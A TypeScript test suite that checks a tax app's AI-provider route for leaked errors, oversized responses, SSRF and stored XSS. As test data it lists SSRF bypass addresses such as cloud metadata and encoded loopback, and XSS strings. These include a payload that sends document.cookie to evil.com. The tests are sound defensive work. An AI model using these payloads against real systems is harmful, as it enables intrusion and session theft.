vi.mock("server-only", () => ({}));
import { describe, expect, it, vi } from "vitest";
import { createProviderWorkspaceRouteHandlers as routeHandlers } from "../../../apps/web/src/lib/provider-workspace-route";
import { createProviderWorkspaceResponder as responder, isAllowedProviderUrl, sanitizeHtmlEntities } from "../../../apps/web/src/lib/provider-workspace-responder";
import type { ProviderWorkspaceRequest } from "../../../apps/web/src/lib/provider-workspace-request";

const evaluation = { mode: "evaluation" as const, syntheticFixtureId: "security-fixture", now: () => "2026-10-25T02:00:00Z" };
function createProviderWorkspaceResponder(dependencies: Parameters<typeof responder>[0] = {}) {
  return responder({ ...dependencies, ...(dependencies.env?.MODEL_PROVIDER_API_KEY ? { execution: evaluation } : {}) });
}
function createProviderWorkspaceRouteHandlers(dependencies: Parameters<typeof routeHandlers>[0] = {}) {
  return routeHandlers({ ...dependencies, ...(dependencies.env?.MODEL_PROVIDER_API_KEY ? { execution: evaluation } : {}) });
}

function buildMinimalWorkspaceRequest(): ProviderWorkspaceRequest {
  return {
    task: "workspace-summary",
    requestId: "provider-workspace:ws-1:2026-03-27T00:00:00.000Z",
    requestedAt: "2026-03-27T00:00:00.000Z",
    replacementCount: 0,
    redactions: [],
    unsupportedRoutes: [],
    workspace: {
      id: "ws-1",
      createdAt: "2026-03-27T00:00:00.000Z",
      updatedAt: "2026-03-27T00:00:00.000Z",
      storageMode: "local-browser",
      documents: [],
      summary: {
        totalDocuments: 0,
        officialFixtureMatches: 0,
        supportedDocuments: 0,
        pendingReviewDocuments: 0,
        interviewQuestionsRemaining: 0
      },
      seededReturn: {
        status: "ready-for-interview",
        taxYearHints: [2025],
        facts: [],
        interviewQuestions: [],
        interviewQueue: [],
        nextQuestionId: null,
        reviewNotes: []
      },
      structuredFacts: [],
      returnSummary: {
        status: "ready-to-recompute",
        targetTaxYear: 2025,
        taxYearState: "single",
        answeredFactCount: 0,
        totalFactCount: 0,
        readyItemCount: 0,
        itemCount: 0,
        blockers: [],
        items: []
      },
      enginePreview: null,
      checklist: [],
      auditTrail: []
    }
  };
}

describe("security: data protection — model provider error sanitization", () => {
  it("provider route returns generic 502 when model provider fails — no internal details leak", async () => {
    const { POST } = createProviderWorkspaceRouteHandlers({
      env: {
        TAX_ENGINE_DEPLOYMENT_MODE: "self-host",
        MODEL_PROVIDER_API_KEY: "test-key"
      },
      fetchFn: vi.fn().mockResolvedValue(
        new Response(JSON.stringify({
          error: {
            message: "Rate limit exceeded for org-abc123: too many tokens, limit 90000, used 92456. User data echoed: SSN 123-45-6789"
          }
        }), { status: 200, headers: { "content-type": "application/json" } })
      )
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(buildMinimalWorkspaceRequest())
    }));

    expect(response.status).toBe(502);
    const body = await response.json();
    expect(body.error).toBe("Configured provider workspace request failed.");
    expect(JSON.stringify(body)).not.toContain("org-abc123");
    expect(JSON.stringify(body)).not.toContain("123-45-6789");
    expect(JSON.stringify(body)).not.toContain("Rate limit exceeded");
  });

  it("provider responder throws generic error when model returns error with sensitive content", async () => {
    const respond = createProviderWorkspaceResponder({
      env: { MODEL_PROVIDER_API_KEY: "test-key" },
      fetchFn: vi.fn().mockResolvedValue(
        new Response(JSON.stringify({
          error: {
            message: "Invalid request: input contained 123-45-6789 which is prohibited"
          }
        }), { status: 200, headers: { "content-type": "application/json" } })
      )
    });

    await expect(respond(buildMinimalWorkspaceRequest())).rejects.toThrow(
      "AI provider request failed; usage requires reconciliation."
    );
  });

  it("provider route returns generic 502 when model returns non-JSON response", async () => {
    const { POST } = createProviderWorkspaceRouteHandlers({
      env: {
        TAX_ENGINE_DEPLOYMENT_MODE: "self-host",
        MODEL_PROVIDER_API_KEY: "test-key"
      },
      fetchFn: vi.fn().mockResolvedValue(
        new Response("Internal server error: database connection to prod-db-xyz failed", {
          status: 500
        })
      )
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(buildMinimalWorkspaceRequest())
    }));

    expect(response.status).toBe(502);
    const body = await response.json();
    expect(body.error).toBe("Configured provider workspace request failed.");
    expect(JSON.stringify(body)).not.toContain("prod-db-xyz");
  });
});

describe("security: data protection — model provider request does not store data", () => {
  it("model provider request includes store:false to prevent third-party data retention", async () => {
    const fetchFn = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({
        status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: "Workspace summary." })
      }), { status: 200, headers: { "content-type": "application/json" } })
    );

    const respond = createProviderWorkspaceResponder({
      env: { MODEL_PROVIDER_API_KEY: "test-key" },
      fetchFn
    });

    await respond(buildMinimalWorkspaceRequest());

    expect(fetchFn).toHaveBeenCalledOnce();
    const [, options] = fetchFn.mock.calls[0];
    const requestBody = JSON.parse(options.body);
    expect(requestBody.store).toBe(false);
  });
});

describe("security: data protection — provider summary length bound", () => {
  it("rejects provider summary exceeding 2000 characters and preserves incurred cost", async () => {
    const longSummary = "A".repeat(5000);
    const fetchFn = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({
        status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: longSummary })
      }), { status: 200, headers: { "content-type": "application/json" } })
    );

    const respond = createProviderWorkspaceResponder({
      env: { MODEL_PROVIDER_API_KEY: "test-key" },
      fetchFn
    });

    const result = await respond(buildMinimalWorkspaceRequest());
    expect(result.provider).toBe("mock-local");
    expect(result.summary).not.toContain("A".repeat(2000));
    expect(result.usage?.usageKind).toBe("reported");
  });

  it("preserves provider summary within 2000 characters", async () => {
    const normalSummary = "Workspace is ready for recompute with 0 documents.";
    const fetchFn = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({
        status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: normalSummary })
      }), { status: 200, headers: { "content-type": "application/json" } })
    );

    const respond = createProviderWorkspaceResponder({
      env: { MODEL_PROVIDER_API_KEY: "test-key" },
      fetchFn
    });

    const result = await respond(buildMinimalWorkspaceRequest());
    expect(result.summary).toBe(normalSummary);
  });
});

describe("security: data protection — API response data minimization", () => {
  it("provider workspace mock response contains only declared fields", async () => {
    const { POST } = createProviderWorkspaceRouteHandlers({
      env: { TAX_ENGINE_DEPLOYMENT_MODE: "self-host" }
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(buildMinimalWorkspaceRequest())
    }));

    expect(response.status).toBe(200);
    const body = await response.json();
    const allowedKeys = new Set([
      "task", "modelId", "requestId", "provider", "summary", "totalDocuments",
      "pendingQuestionCount", "readyForRecompute", "redactionCount"
    ]);
    for (const key of Object.keys(body)) {
      expect(allowedKeys.has(key)).toBe(true);
    }
    expect(body).not.toHaveProperty("workspace");
    expect(body).not.toHaveProperty("redactions");
    expect(body).not.toHaveProperty("unsupportedRoutes");
  });

  it("provider workspace route rejects requests containing unredacted SSNs", async () => {
    const request = buildMinimalWorkspaceRequest();
    (request.workspace as Record<string, unknown>).notes = "Filer SSN is 123-45-6789";

    const { POST } = createProviderWorkspaceRouteHandlers({
      env: { TAX_ENGINE_DEPLOYMENT_MODE: "self-host" }
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(request)
    }));

    expect(response.status).toBe(400);
    const body = await response.json();
    expect(body.error).toBe("Provider workspace request contains unredacted direct identifiers.");
    expect(JSON.stringify(body)).not.toContain("123-45-6789");
  });
});

describe("security: SSRF protection — provider base URL validation", () => {
  it("allows standard HTTPS API endpoints", () => {
    expect(isAllowedProviderUrl("https://api.openai.com/v1")).toBe(true);
    expect(isAllowedProviderUrl("https://api.anthropic.com/v1")).toBe(true);
    expect(isAllowedProviderUrl("https://custom-provider.example.com")).toBe(true);
  });

  it("allows HTTP for external hosts (dev proxies)", () => {
    expect(isAllowedProviderUrl("http://api.openai.com/v1")).toBe(true);
  });

  it("blocks localhost addresses", () => {
    expect(isAllowedProviderUrl("http://localhost")).toBe(false);
    expect(isAllowedProviderUrl("http://localhost:3000")).toBe(false);
    expect(isAllowedProviderUrl("https://localhost/api")).toBe(false);
    expect(isAllowedProviderUrl("http://127.0.0.1")).toBe(false);
    expect(isAllowedProviderUrl("http://127.0.0.1:8080")).toBe(false);
  });

  it("blocks private IPv4 ranges", () => {
    expect(isAllowedProviderUrl("http://10.0.0.1")).toBe(false);
    expect(isAllowedProviderUrl("http://10.255.255.255")).toBe(false);
    expect(isAllowedProviderUrl("http://172.16.0.1")).toBe(false);
    expect(isAllowedProviderUrl("http://172.31.255.255")).toBe(false);
    expect(isAllowedProviderUrl("http://192.168.1.1")).toBe(false);
    expect(isAllowedProviderUrl("http://192.168.0.100")).toBe(false);
  });

  it("blocks cloud metadata endpoints", () => {
    expect(isAllowedProviderUrl("http://169.254.169.254")).toBe(false);
    expect(isAllowedProviderUrl("http://169.254.169.254/latest/meta-data/")).toBe(false);
    expect(isAllowedProviderUrl("http://metadata.google.internal")).toBe(false);
  });

  it("blocks IPv6 loopback", () => {
    expect(isAllowedProviderUrl("http://[::1]")).toBe(false);
  });

  it("blocks non-HTTP protocols", () => {
    expect(isAllowedProviderUrl("file:///etc/passwd")).toBe(false);
    expect(isAllowedProviderUrl("ftp://internal.server")).toBe(false);
    expect(isAllowedProviderUrl("gopher://evil.com")).toBe(false);
  });

  it("blocks 0.0.0.0", () => {
    expect(isAllowedProviderUrl("http://0.0.0.0")).toBe(false);
  });

  it("blocks entire 127.0.0.0/8 loopback range", () => {
    expect(isAllowedProviderUrl("http://127.0.0.2")).toBe(false);
    expect(isAllowedProviderUrl("http://127.255.255.255")).toBe(false);
  });

  it("blocks IPv4-mapped IPv6 addresses bypassing loopback checks", () => {
    // WHATWG URL parser normalizes ::ffff:127.0.0.1 to ::ffff:7f00:1
    expect(isAllowedProviderUrl("http://[::ffff:127.0.0.1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[::ffff:127.0.0.1]:8080")).toBe(false);
  });

  it("blocks IPv4-mapped IPv6 addresses bypassing private range checks", () => {
    expect(isAllowedProviderUrl("http://[::ffff:10.0.0.1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[::ffff:172.16.0.1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[::ffff:192.168.1.1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[::ffff:169.254.169.254]")).toBe(false);
  });

  it("allows IPv4-mapped IPv6 with safe external addresses", () => {
    expect(isAllowedProviderUrl("http://[::ffff:8.8.8.8]")).toBe(true);
  });

  it("blocks IPv6 unique local addresses (fc00::/7)", () => {
    expect(isAllowedProviderUrl("http://[fc00::1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[fd00::1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[fdab:cdef::1]")).toBe(false);
  });

  it("blocks IPv6 link-local addresses (fe80::/10)", () => {
    expect(isAllowedProviderUrl("http://[fe80::1]")).toBe(false);
    // fe80::1%25eth0 is invalid URL syntax — parser rejects it (returns false)
    expect(isAllowedProviderUrl("http://[fe80::1%25eth0]")).toBe(false);
    expect(isAllowedProviderUrl("http://[feb0::1]")).toBe(false);
  });

  it("blocks decimal IP notation — URL parser normalizes 2130706433 to 127.0.0.1", () => {
    expect(isAllowedProviderUrl("http://2130706433")).toBe(false);
    expect(isAllowedProviderUrl("http://3232235521")).toBe(false); // 192.168.0.1
  });

  it("blocks hex IP notation — URL parser normalizes 0x7f000001 to 127.0.0.1", () => {
    expect(isAllowedProviderUrl("http://0x7f000001")).toBe(false);
  });

  it("blocks octal IP notation — URL parser normalizes 0177.0.0.1 to 127.0.0.1", () => {
    expect(isAllowedProviderUrl("http://0177.0.0.1")).toBe(false);
  });

  it("blocks CGNAT / shared address space (RFC 6598: 100.64.0.0/10)", () => {
    expect(isAllowedProviderUrl("http://100.64.0.1")).toBe(false);
    expect(isAllowedProviderUrl("http://100.64.0.1:8080")).toBe(false);
    expect(isAllowedProviderUrl("http://100.100.100.100")).toBe(false);
    expect(isAllowedProviderUrl("http://100.127.255.255")).toBe(false);
    // Just outside the CGNAT range — should be allowed
    expect(isAllowedProviderUrl("http://100.63.255.255")).toBe(true);
    expect(isAllowedProviderUrl("http://100.128.0.0")).toBe(true);
  });

  it("blocks CGNAT via IPv4-mapped IPv6 bypass", () => {
    // ::ffff:100.64.0.1 normalizes to ::ffff:6440:1
    expect(isAllowedProviderUrl("http://[::ffff:100.64.0.1]")).toBe(false);
    expect(isAllowedProviderUrl("http://[::ffff:100.100.100.100]")).toBe(false);
  });

  it("blocks benchmark testing range (RFC 2544: 198.18.0.0/15)", () => {
    expect(isAllowedProviderUrl("http://198.18.0.1")).toBe(false);
    expect(isAllowedProviderUrl("http://198.19.255.255")).toBe(false);
    // Just outside the range — should be allowed
    expect(isAllowedProviderUrl("http://198.17.255.255")).toBe(true);
    expect(isAllowedProviderUrl("http://198.20.0.0")).toBe(true);
  });

  it("blocks IPv6 unspecified address (::)", () => {
    expect(isAllowedProviderUrl("http://[::]")).toBe(false);
    expect(isAllowedProviderUrl("http://[::]:8080")).toBe(false);
  });

  it("blocks URLs with embedded credentials", () => {
    expect(isAllowedProviderUrl("http://user:pass@evil.com")).toBe(false);
    expect(isAllowedProviderUrl("https://admin:secret@api.example.com/v1")).toBe(false);
    expect(isAllowedProviderUrl("http://user@evil.com")).toBe(false);
  });

  it("blocks trailing-dot FQDN bypass — localhost. resolves to 127.0.0.1", () => {
    expect(isAllowedProviderUrl("http://localhost.")).toBe(false);
    expect(isAllowedProviderUrl("http://localhost.:3000")).toBe(false);
    expect(isAllowedProviderUrl("https://localhost./api")).toBe(false);
  });

  it("blocks trailing-dot FQDN bypass on cloud metadata hostnames", () => {
    expect(isAllowedProviderUrl("http://metadata.google.internal.")).toBe(false);
  });

  it("blocks short-form zero IP — URL parser normalizes 0 to 0.0.0.0", () => {
    expect(isAllowedProviderUrl("http://0")).toBe(false);
    expect(isAllowedProviderUrl("http://0:8080")).toBe(false);
  });

  it("blocks abbreviated loopback — URL parser normalizes 127.1 to 127.0.0.1", () => {
    expect(isAllowedProviderUrl("http://127.1")).toBe(false);
    expect(isAllowedProviderUrl("http://127.1:8080")).toBe(false);
  });

  it("blocks mixed hex/decimal IP notation — URL parser normalizes 0x7f.0.0.1 to 127.0.0.1", () => {
    expect(isAllowedProviderUrl("http://0x7f.0.0.1")).toBe(false);
  });

  it("rejects invalid URLs", () => {
    expect(isAllowedProviderUrl("not-a-url")).toBe(false);
    expect(isAllowedProviderUrl("")).toBe(false);
  });

  it("provider responder rejects requests when base URL targets internal network", async () => {
    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "http://169.254.169.254/latest"
      },
      fetchFn: vi.fn()
    });

    await expect(respond(buildMinimalWorkspaceRequest())).rejects.toThrow(
      "Only the fixed official AI provider endpoint is supported."
    );
  });

  it("provider route returns 502 (not internal details) when SSRF is blocked", async () => {
    const { POST } = createProviderWorkspaceRouteHandlers({
      env: {
        TAX_ENGINE_DEPLOYMENT_MODE: "self-host",
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "http://10.0.0.1:8080"
      },
      fetchFn: vi.fn()
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(buildMinimalWorkspaceRequest())
    }));

    expect(response.status).toBe(502);
    const body = await response.json();
    expect(body.error).toBe("Configured provider workspace request failed.");
    expect(JSON.stringify(body)).not.toContain("10.0.0.1");
  });
});

describe("security: provider response body size limit", () => {
  it("rejects model provider responses exceeding 1 MB", async () => {
    // Create a response body just over 1 MB
    const oversizedBody = JSON.stringify({
      status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: "A".repeat(1024 * 1024 + 100) })
    });

    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn: async () => new Response(oversizedBody, {
        status: 200,
        headers: { "content-type": "application/json" }
      })
    });

    await expect(respond(buildMinimalWorkspaceRequest())).rejects.toThrow(
      "AI provider request failed; usage requires reconciliation."
    );
  });

  it("accepts model provider responses within 1 MB", async () => {
    const normalSummary = "Workspace ready for recompute.";
    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn: async () => new Response(JSON.stringify({
        status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: normalSummary })
      }), {
        status: 200,
        headers: { "content-type": "application/json" }
      })
    });

    const result = await respond(buildMinimalWorkspaceRequest());
    expect(result.summary).toBe(normalSummary);
  });

  it("provider route returns generic 502 when response is oversized — no size details leak", async () => {
    const oversizedBody = "X".repeat(1024 * 1024 + 1);

    const { POST } = createProviderWorkspaceRouteHandlers({
      env: {
        TAX_ENGINE_DEPLOYMENT_MODE: "self-host",
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      fetchFn: async () => new Response(oversizedBody, {
        status: 200,
        headers: { "content-type": "application/json" }
      })
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(buildMinimalWorkspaceRequest())
    }));

    expect(response.status).toBe(502);
    const body = await response.json();
    expect(body.error).toBe("Configured provider workspace request failed.");
    expect(JSON.stringify(body)).not.toContain("exceeded");
    expect(JSON.stringify(body)).not.toContain("1 MB");
  });
});

describe("security: SSRF defense-in-depth — provider fetch rejects redirects", () => {
  it("provider responder rejects redirects to prevent SSRF via 302 to internal IP", async () => {
    const fetchFn = vi.fn().mockResolvedValue(
      Response.redirect("http://169.254.169.254/latest/meta-data/", 302)
    );

    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn
    });

    await expect(respond(buildMinimalWorkspaceRequest())).rejects.toThrow();
  });

  it("provider fetch sends redirect:'error' to prevent following redirects", async () => {
    const fetchFn = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({
        status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: "Workspace ready." })
      }), { status: 200, headers: { "content-type": "application/json" } })
    );

    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn
    });

    await respond(buildMinimalWorkspaceRequest());

    expect(fetchFn).toHaveBeenCalledOnce();
    const [, options] = fetchFn.mock.calls[0];
    expect(options.redirect).toBe("error");
  });

  it("provider route returns 502 when redirect is attempted — no redirect target leaks", async () => {
    const fetchFn = vi.fn().mockRejectedValue(
      new TypeError("fetch failed (redirect mode is 'error')")
    );

    const { POST } = createProviderWorkspaceRouteHandlers({
      env: {
        TAX_ENGINE_DEPLOYMENT_MODE: "self-host",
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      fetchFn
    });

    const response = await POST(new Request("http://localhost/api/provider/workspace", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(buildMinimalWorkspaceRequest())
    }));

    expect(response.status).toBe(502);
    const body = await response.json();
    expect(body.error).toBe("Configured provider workspace request failed.");
    expect(JSON.stringify(body)).not.toContain("169.254");
    expect(JSON.stringify(body)).not.toContain("redirect");
  });
});

describe("security: provider response streaming size enforcement", () => {
  it("aborts reading mid-stream when response exceeds 1 MB limit", async () => {
    // Create a ReadableStream that emits chunks totaling >1 MB
    const chunkSize = 256 * 1024; // 256 KB per chunk
    let chunksEmitted = 0;
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (chunksEmitted >= 6) { // 6 * 256KB = 1.5 MB > 1 MB limit
          controller.close();
          return;
        }
        controller.enqueue(new Uint8Array(chunkSize).fill(65)); // 'A'
        chunksEmitted++;
      }
    });

    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn: async () => new Response(stream, {
        status: 200,
        headers: { "content-type": "application/json" }
      })
    });

    await expect(respond(buildMinimalWorkspaceRequest())).rejects.toThrow(
      "AI provider request failed; usage requires reconciliation."
    );
  });

  it("rejects response when Content-Length header declares size over limit (pre-check)", async () => {
    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn: async () => new Response("small body", {
        status: 200,
        headers: {
          "content-type": "application/json",
          "content-length": String(2 * 1024 * 1024) // 2 MB declared
        }
      })
    });

    await expect(respond(buildMinimalWorkspaceRequest())).rejects.toThrow(
      "AI provider request failed; usage requires reconciliation."
    );
  });

  it("reads small response body successfully through streaming path", async () => {
    const normalSummary = "Workspace ready for recompute.";
    const body = JSON.stringify({
      status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: normalSummary })
    });

    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn: async () => new Response(body, {
        status: 200,
        headers: { "content-type": "application/json" }
      })
    });

    const result = await respond(buildMinimalWorkspaceRequest());
    expect(result.summary).toBe(normalSummary);
  });
});

describe("security: provider summary HTML sanitization (stored XSS prevention)", () => {
  it("escapes HTML tags in provider summary text", () => {
    expect(sanitizeHtmlEntities('<script>alert("xss")</script>'))
      .toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  });

  it("escapes ampersands to prevent HTML entity injection", () => {
    expect(sanitizeHtmlEntities("AT&T income & gains"))
      .toBe("AT&amp;T income &amp; gains");
  });

  it("escapes single quotes to prevent attribute breakout", () => {
    expect(sanitizeHtmlEntities("user's data")).toBe("user&#x27;s data");
  });

  it("escapes angle brackets used in event handlers", () => {
    expect(sanitizeHtmlEntities('<img onerror="alert(1)" src=x>'))
      .toBe('&lt;img onerror=&quot;alert(1)&quot; src=x&gt;');
  });

  it("preserves plain text without modification (except ampersands)", () => {
    const plain = "Workspace is ready for deterministic recompute across 3 documents.";
    expect(sanitizeHtmlEntities(plain)).toBe(plain);
  });

  it("provider responder sanitizes model output containing HTML", async () => {
    const xssPayload = '<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">';
    const respond = createProviderWorkspaceResponder({
      env: {
        MODEL_PROVIDER_API_KEY: "test-key",
        MODEL_PROVIDER_BASE_URL: "https://api.openai.com/v1"
      },
      skipUrlValidation: true,
      fetchFn: async () => new Response(JSON.stringify({
        status: "completed", usage: { input_tokens: 100, output_tokens: 100 },
        output_text: JSON.stringify({ disposition: "answer", sourceIds: ["workspace:status"], summary: xssPayload })
      }), { status: 200 })
    });

    const result = await respond(buildMinimalWorkspaceRequest());
    expect(result.summary).not.toContain("<");
    expect(result.summary).not.toContain(">");
    expect(result.summary).toContain("&lt;");
    expect(result.summary).toContain("&gt;");
  });
});
